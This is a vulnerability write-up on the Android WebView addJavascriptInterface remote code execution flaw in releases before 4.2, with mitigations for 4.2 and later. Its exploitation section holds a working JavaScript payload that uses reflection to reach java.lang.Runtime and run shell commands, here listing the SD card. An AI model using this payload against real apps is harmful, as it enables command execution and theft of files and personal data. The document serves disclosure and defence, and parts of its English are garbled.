### Vulnerablity Impact:
Through the JavaScript, anything can access the device on the SD card, and even contact information, SMS etc.. It's disgusting, quack. 

1. WebView adds a JavaScript object, and the current application with SDCard read and write permissions, or: android.permission.WRITE_EXTERNAL_STORAGE

2. Through the window object can be found in JS, the object "getClass" method, and then through the reflection mechanism, get the Runtime object, then call the static method to run some commands, such as access to the file command.

3. The string returned from the execution command input stream, you can get the information of the file name. Then do what you want to do, good risk. The core JS code as follows: 


         function execute(cmdArgs)  
        {  
            for (var obj in window) {  
               if ("getClass" in window[obj]) {  
                alert(obj);  
                return  window[obj].getClass().forName("java.lang.Runtime")  
                     .getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);  
              }  
           }  
       }   

------

### Exploitation

In order to prove this loophole, I'm just loading a malicious JS code of the local Webpage, HTML the code as follows:


    <html>  
      <head>  
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">  
        <script>  
          var i=0;  
          function getContents(inputStream)  
          {  
            var contents = ""+i;  
            var b = inputStream.read();  
            var i = 1;  
            while(b != -1) {  
                var bString = String.fromCharCode(b);  
                contents += bString;  
                contents += "\n"  
                b = inputStream.read();  
            }  
            i=i+1;  
            return contents;  
           }  
            
           function execute(cmdArgs)  
           {  
            for (var obj in window) {  
                console.log(obj);  
                if ("getClass" in window[obj]) {  
                    alert(obj);  
                    return window[obj].getClass().forName("java.lang.Runtime").  
                        getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);  
                 }  
             }  
           }   
            
          var p = execute(["ls","/mnt/sdcard/"]);  
          document.write(getContents(p.getInputStream()));  
        </script>  
      
        <script language="javascript">  
          function onButtonClick()   
          {  
            // Call the method of injected object from Android source.  
            var text = jsInterface.onButtonClick("Text passed in from the JS！！！");  
            alert(text);  
          }  
      
          function onImageClick()   
          {  
            //Call the method of injected object from Android source.  
            var src = document.getElementById("image").src;  
            var width = document.getElementById("image").width;  
            var height = document.getElementById("image").height;  
      
            // Call the method of injected object from Android source.  
            jsInterface.onImageClick(src, width, height);  
          }  
        </script>  
      </head>  
      
      <body>  
          <p>Click on the image to the URL to Java code</p>  
          <img class="curved_box" id="image"   
             onclick="onImageClick()"  
             width="328"  
             height="185"
             src="https://avicoder.me/webview/phuck.png"  
             onerror="this.src='phuckerror.png'"/>  
        </p>  
        <button type="button" onclick="onButtonClick()">Interaction with the Java code</button>  
      </body>  
    </html>  

 1. Please seeexecute()The method, which the traversal of all window object, an object with a getClass method and then find, use this object class, find the java.lang.Runtime object, then call the "getRuntime" static method to get an instance of Runtime, and then call exec () method to execute a command.
 2. getContents()Methods, read from the stream, displayed in the interface.
 3. Key code is in the following sentences

`return      window[obj].getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);`

Java code is as follows: 
 
    mWebView = (WebView) findViewById(R.id.webview);  
    mWebView.getSettings().setJavaScriptEnabled(true);  
    mWebView.addJavascriptInterface(new JSInterface(), "jsInterface");  
    mWebView.loadUrl("file:///android_asset/html/test.html");  

Need to add permissions:  

    <uses-permission android:name="android.permission.INTERNET"/>  
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />  
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />  

------

### Mitigation
-  System Android 4.2 or above
In Android 4.2 or above, Google was modified, the statement on the Java remote method of a @JavascriptInterface, as in the following code: 


    class JsObject {  
       @JavascriptInterface  
       public String toString() { return "injectedObject"; }  
    }  
    webView.addJavascriptInterface(new JsObject(), "injectedObject");  
    webView.loadData("", "text/html", null);  
    webView.loadUrl("javascript:alert(injectedObject.toString())");  

-  System Android 4.2 below

This problem is difficult to solve, but also can not solve.
First of all, we must not call the addJavascriptInterface method. On this issue, the core is to know the JS event this one action, JS interacts with Java we know, there are several, than the prompt, alert, such action would correspond toWebChromeClientMethod, the corresponding class for prompt, which corresponds to theonJsPromptMethod, this method statement as follows: 


    public boolean onJsPrompt(WebView view, String url, String message,   
        String defaultValue, JsPromptResult result)  

By this method, JS can make information (text) transfer to Java, and Java also can get information (text) is transmitted to the JS.
